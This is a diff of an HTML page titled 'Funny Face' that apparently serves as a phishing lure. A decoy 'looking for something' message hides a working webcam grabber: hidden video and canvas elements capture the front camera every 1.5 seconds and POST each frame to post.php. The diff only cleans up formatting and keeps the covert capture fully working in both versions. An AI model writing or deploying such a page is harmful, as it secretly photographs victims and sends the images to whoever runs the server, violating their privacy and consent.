@@ -1,119 +1,113 @@
 <!doctype html>
-<html>
+<html lang="en">
+
 <head>
-<title>funny face</title>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="main.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Face</title>
+    <link rel="stylesheet" type="text/css" href="main.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js" defer></script>
+    <script src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js" defer></script>
+    <style>
+        body {
+            background-image: url('worldmap.jpg');
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+
+        h1 {
+            font-family: 'Raleway', sans-serif;
+            color: white;
+            text-align: center;
+            filter: drop-shadow(0px 0px 8px cyan);
+            margin: auto;
+            position: fixed;
+            top: 5%;
+            left: 0;
+            right: 0;
+        }
+
+        p {
+            font-family: 'Raleway', sans-serif;
+            color: white;
+            text-align: center;
+            filter: drop-shadow(0px 0px 8px cyan);
+            margin: auto;
+            position: fixed;
+            top: 5%;
+            left: 0;
+            right: 0;
+            z-index: 1;
+        }
+    </style>
 </head>
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
-
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-
-<script>
-
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 580);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
-}
-
-// Load init
-init();
-
-
-
-</script>
-
 <body>
-<style>
-body 
-{
-   background-image: url('worldmap.jpg'); 
-   background-repeat: no-repeat;
-   background-size: cover;
-}
-h1
-{
-  font-family: 'Raleway', sans-serif;
-  color: white;
-  text-align: center;
-  filter: drop-shadow(0px 0px 8px cyan);
-  margin: auto;
-  position: fixed;
-  top: 5%;
-  left: 0%;
-  right: 0%;
-}
-p 
-{
-  font-family: 'Raleway', sans-serif;
-  color: white;
-  text-align: center;
-  filter: drop-shadow(0px 0px 8px cyan);
-  margin: auto;
-  position: fixed;
-  top: 5%;
-  left: 0%;
-  right: 0%;
-  z-index: 1;
-}
-</style>
-     
-<p><h1>looking for something, wait few seconds......</h1></p
+    <div class="video-wrap" hidden>
+        <video id="video" playsinline autoplay></video>
+    </div>
+
+    <canvas hidden id="canvas" width="640" height="480"></canvas>
+
+    <p>
+        <h1>Looking for something, wait a few seconds......</h1>
+    </p>
+
+    <script>
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Set up webcam constraints
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        // Access webcam and handle errors
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (error) {
+                console.error(`navigator.getUserMedia error: ${error}`);
+            }
+        }
+
+        // Handle successful webcam access
+        function handleSuccess(stream) {
+            video.srcObject = stream;
+            const context = canvas.getContext('2d');
+
+            setInterval(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+
+        // Send image data to the server
+        function post(imgData) {
+            $.ajax({
+                type: 'POST',
+                url: 'post.php',
+                data: { cat: imgData },
+                dataType: 'json',
+                success: (result) => {
+                    // Handle the server response here if needed
+                },
+                error: () => {
+                    console.error("Error posting data");
+                }
+            });
+        }
+
+        // Initialize the webcam on page load
+        init();
+    </script>
 </body>
+
 </html>
